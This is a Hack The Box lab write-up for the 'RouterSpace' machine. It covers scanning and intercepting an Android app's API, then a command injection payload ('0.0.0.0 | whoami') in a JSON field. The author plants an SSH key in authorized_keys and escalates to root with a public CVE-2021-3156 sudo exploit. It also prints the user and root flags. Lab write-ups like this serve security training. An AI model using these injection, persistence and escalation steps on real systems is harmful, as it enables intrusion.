---
title: "HTB Routerspace Writeup"
date: 2022-03-07T12:32:16+05:30
draft: false
tags: ['Linux', 'Easy', 'APK', 'Anbox', 'Active']
categories: ['Linux Easy']
---

{{<figure src="/images/routerspace/routerspace.png" title="RouterSpace HTB">}}

# Process
* Added routerspace.htb to /etc/hosts using `sudo echo '<ip> routerspace.htb' >> /etc/hosts`
	
* Nmap
    * Found two tcp open ports and no udp ports
	* 22/tcp open  ssh
	* 80/tcp open  http
* DirEnumeration
    * ffuf and gobuster scan carried out on routerspace.htb => No useful dir founds
* VhostEnumeration
    * No useful subdomains found
* http{?:}//routerspace.htb
    * No actionable OSINT found
    * Found a hyperlink to an apk => routerspace.apk
* Anbox
    * Started anbox for testing the routerspace.apk 
    * Installed the apk using `adb install routerspace.apk`
    * Configured the proxy to intercept the requests on port 8999 on all interfaces
    * Configure the adb to send requests to the `<ip>:8999` => `adb shell settings put global http_proxy 192.168.250.1:8999`
    * Intercepted a POST request to `/api/v4/monitoring/router/dev/check/deviceAccess`
* Command Injection
    * POST request had json in its body with parameter ip
    * using operator such as `&, |, ;`
* Foothold
    * None of the reverse shell worked
	* Most probably because of the ip tables configuration
    * On enumeration, USER: Paul was found to have write privileges on .ssh
    *	Generated an ssh key pair using ssh-keygen and uploaded the public key to /home/paul/.ssh/authorized_keys
    * Now using the private key we logged on the routerspace.htb
* Privilege Escalation
    * Executed linpeas script found the sudo version vulnerable 
    * Searched for the exploit and executed it =>CVE-2021-3156 

## Enumeration
   
### Nmap Scans
* Found two tcp ports open
	* 22/tcp ssh
	* 80/tcp http
*	Results cororborated by masscan

```bash
sudo nmap -A -sC -Pn routerspace.htb -oN nmap.adc
[sudo] password for babayaga: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-06 15:23 IST
Nmap scan report for routerspace.htb (10.129.151.201)
Host is up (0.16s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-10471
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 79
|     ETag: W/"4f-UUpLZjWmW065QhEa4gf63Kfxs/I"
|     Date: Sun, 06 Mar 2022 09:53:40 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: t nYh 4l l S ct m ny Cr }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-59306
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Sun, 06 Mar 2022 09:53:38 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-86858
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sun, 06 Mar 2022 09:53:39 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.91%I=7%D=3/6%Time=622484A0%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.91%I=7%D=3/6%Time=622484A0%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,13E4,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterS
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sun,\x2006\x20Mar\x202022\x2009:53:
;
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (92%), Linux 4.15 - 5.6 (90%), Crestron XPanel control system (90%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 5.0 (89%), Linux 5.0 - 5.3 (89%), Linux 5.0 - 5.4 (88%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   157.47 ms 10.10.14.1
2   157.52 ms routerspace.htb (10.129.151.201)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.41 seconds
```


### FFUF
* No useful directories found
* Recived valid response for garbage input with no similarity accross the response to deploy the filters

```bash
ffuf -u http://routerspace.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.js,.html -of md -o dir.common.routerspace -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://routerspace.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt .js .html 
 :: Output file      : dir.common.routerspace
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.bash_history           [Status: 200, Size: 68, Words: 12, Lines: 3]
.config.html            [Status: 200, Size: 73, Words: 15, Lines: 7]
.cache.html             [Status: 200, Size: 69, Words: 15, Lines: 6]
.cvs.html               [Status: 200, Size: 71, Words: 15, Lines: 2]
.cvs.php                [Status: 200, Size: 71, Words: 17, Lines: 4]
.config                 [Status: 200, Size: 70, Words: 16, Lines: 5]
.cvsignore              [Status: 200, Size: 67, Words: 16, Lines: 4]
.cvs.js                 [Status: 200, Size: 62, Words: 16, Lines: 2]
.cvsignore.txt          [Status: 200, Size: 78, Words: 16, Lines: 3]
.bashrc.txt             [Status: 200, Size: 71, Words: 15, Lines: 5]
.forward.js             [Status: 200, Size: 68, Words: 13, Lines: 8]
.bash_history.txt       [Status: 200, Size: 73, Words: 15, Lines: 7]
.cache.php              [Status: 200, Size: 82, Words: 17, Lines: 8]
.cache                  [Status: 200, Size: 70, Words: 17, Lines: 6]
.cvsignore.js           [Status: 200, Size: 74, Words: 15, Lines: 8]
.bash_history.js        [Status: 200, Size: 71, Words: 16, Lines: 6]
.txt                    [Status: 200, Size: 80, Words: 18, Lines: 5]
.cvs.txt                [Status: 200, Size: 74, Words: 17, Lines: 7]
.bashrc.js              [Status: 200, Size: 73, Words: 16, Lines: 8]
.config.txt             [Status: 200, Size: 78, Words: 20, Lines: 8]
.html                   [Status: 200, Size: 73, Words: 14, Lines: 8]
.forward.html           [Status: 200, Size: 76, Words: 18, Lines: 1]
.cvsignore.html         [Status: 200, Size: 76, Words: 17, Lines: 6]
.bashrc                 [Status: 200, Size: 72, Words: 15, Lines: 5]
.config.js              [Status: 200, Size: 69, Words: 14, Lines: 7]
.bash_history.php       [Status: 200, Size: 77, Words: 19, Lines: 5]
.bash_history.html      [Status: 200, Size: 71, Words: 14, Lines: 2]
.forward.php            [Status: 200, Size: 69, Words: 16, Lines: 1]
.forward                [Status: 200, Size: 69, Words: 13, Lines: 1]
.bashrc.html            [Status: 200, Size: 72, Words: 14, Lines: 1]
.bashrc.php             [Status: 200, Size: 72, Words: 14, Lines: 6]
```
## RouterSpace Webpage
### Homepage
On logging on to http://routerspace.htb
{{<figure src="/images/routerspace/homepage.png" title="Homepage">}}

### Additional Links Found
* Downloaded the apk for further analysis

{{<figure src="/images/routerspace/APK.png" title="RouterSpace.apk">}}


### Installing Anbox and APK

```bash
┌─[babayaga@babayaga-virtualbox]─[~/Downloads]
└──╼ $adb install RouterSpace.apk 
* daemon not running; starting now at tcp:5037
* daemon started successfully
Performing Streamed Install
Success
```

{{<figure src="/images/routerspace/Anbox.png" title="RouterSpace.apk in Anbox">}}


### Proxy settings
* Burp was configured such that it will intercept the requests on port 8999 from all the interfaces
	* *I forgot to take the screenshop* but you can follow these steps:
		* Proxy>Options>ProxyListenser>Add and configure suitably
* To Anbox to send request on 8999, read the following link
[It is not possible to set proxy settings for network connection · Issue #398 · anbox/anbox · GitHub](https://github.com/anbox/anbox/issues/398)

```bash
─[babayaga@babayaga-virtualbox]─[~/Desktop]
└──╼ $adb shell settings put global http_proxy 192.168.250.1:8999
```

* Reference for configuration*
{{<figure src="/images/routerspace/ProxySettings.png" title="Reference Guide to Proxy Configuration">}}




### Request

*	Request the routerspace.apk was sending

```bash

POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1

accept: application/json, text/plain, */*

user-agent: RouterSpaceAgent

Content-Type: application/json

Content-Length: 16

Host: routerspace.htb

Connection: close

Accept-Encoding: gzip, deflate



{"ip":"0.0.0.0"}

```

{{<figure src="/images/routerspace/RouterAPKRequest.png" title="Captured Request">}}

### Foothold
* Request is vulnerable to command injection

{{<figure src="/images/routerspace/Command_Injection.png" title="Vulnerable to Command Injection">}}

#### Request

```text
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 25
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate


{"ip":"0.0.0.0 | whoami"}
```

#### Response

```
HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-7530
Content-Type: application/json; charset=utf-8
Content-Length: 8
ETag: W/"8-qTM+b2Uq+FmQphCm7m1RM+pENkU"
Date: Sun, 06 Mar 2022 13:33:23 GMT
Connection: close

"paul\n"
```




## Foothold

* No request for reverse shell worked
* But /home/paul/.ssh had write privileges
* Created an ssh key pair 


```bash
┌─[babayaga@babayaga-virtualbox]─[~/.ssh]
└──╼ $ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/babayaga/.ssh/id_rsa): tmp
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in forRouterSpace
Your public key has been saved in forRouterSpace.pub
The key fingerprint is:
SHA256:22ZtDCb89y6FRut4jEgFTkumJ1owa7TZJXcri3o1AvM babayaga@babayaga-virtualbox
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|    + . B .      |
|   . B X + .     |
|    B =.= o .    |
|   . * +S+o. o   |
|    . E =* ++ .  |
|     . +.o=*=.   |
|    . . .ooo=.   |
|     .     . oo  |
+----[SHA256]-----+
```

* Appended the id_rsa.pub to /home/paul/.ssh/authorized_keys on routerspace.htb
{{<figure src="/images/routerspace/not_sure_got_created_keys.png" title="Appending keys to authorized_keys on routerspace.htb">}}


* Logged in using id_rsa (private key)

```bash
sudo ssh -i tmp paul@routerspace.htb
[sudo] password for babayaga: 
The authenticity of host 'routerspace.htb (10.129.152.7)' can't be established.
ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'routerspace.htb,10.129.152.7' (ECDSA) to the list of known hosts.
Enter passphrase for key 'tmp': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
```

{{<figure src="/images/routerspace/LoginUser.png" title="UserLogin">}}

### User Flag
```bash
paul@routerspace:~$ cat user.txt 
3b53f478b34b94d32ea6b38ed6815a30
```

## Privilege Escalation

* IP tables config prohibiting outgoing request, so could not get a reverse shell and can't use curl or wget to tranferfile by creating a web server locally

{{<figure src="/images/routerspace/No_outgoing_Port.png" title="Outbound connection banned maybe some iptables config">}}
* Transfered the linpeas.sh using scp as curl and wget wouldn't have worked because of iptables config

```bash
┌─[✗]─[babayaga@babayaga-virtualbox]─[/opt/Scripts]
└──╼ $sudo scp -i /home/babayaga/.ssh/tmp linpeas.sh paul@routerspace.htb:/home/paul/
Enter passphrase for key '/home/babayaga/.ssh/tmp': 
linpeas.sh                                    100%  746KB  36.8KB/s   00:20   
```

### Executing Linpeas.sh
{{<figure src="/images/routerspace/priv_esc.png" title="Vulnerable Sudo version">}}

#### Sudo version exploit

[CVE-2021-3156/exploit_nss.py at main · worawit/CVE-2021-3156 · GitHub](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)

=> Executed exploit and got root flag

```bash
paul@routerspace:~$ python3 exploit.py 
# ls
exploit.py  libnss_X  linpeas.sh  snap	user.txt
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
e741e9561463f0227c04aacb069e1cec
# 
```

{{<figure src="/images/routerspace/root.png" title="Root Access">}}
